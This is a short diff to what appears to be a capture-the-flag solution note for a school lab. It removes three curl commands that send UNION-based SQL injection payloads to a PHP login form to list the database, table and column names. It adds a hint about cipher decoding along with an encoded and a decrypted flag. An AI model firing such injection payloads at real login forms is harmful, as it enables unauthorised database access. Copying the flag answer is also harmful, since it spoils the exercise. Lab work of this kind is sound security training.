@@ -1,14 +1,8 @@
 """
 solution :
-
-get database name
-    curl -X POST http://hlabs.helb-prigogine.be:6543/plankton.php -d "username=' UNION SELECT DATABASE() -- &password=dummy"
-
-get table name
-    curl -X POST http://hlabs.helb-prigogine.be:6543/plankton.php -d "username=' UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'plankton' -- &password=dummy"
-
-get column name
-    curl -X POST http://hlabs.helb-prigogine.be:6543/plankton.php -d "username=' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'ananas' -- &password=dummy"
+    get the flag from PlanktonJr and use cypher decoding :
 
 
+ORIGINAL : helb{olsi$`7|f:u{:yf8uf;fu:~fK8T:uz87u&}
+DECRYPTED : helb{Y0u_3nt3r_1n_4_n3w_D1M3ns10n}
 """
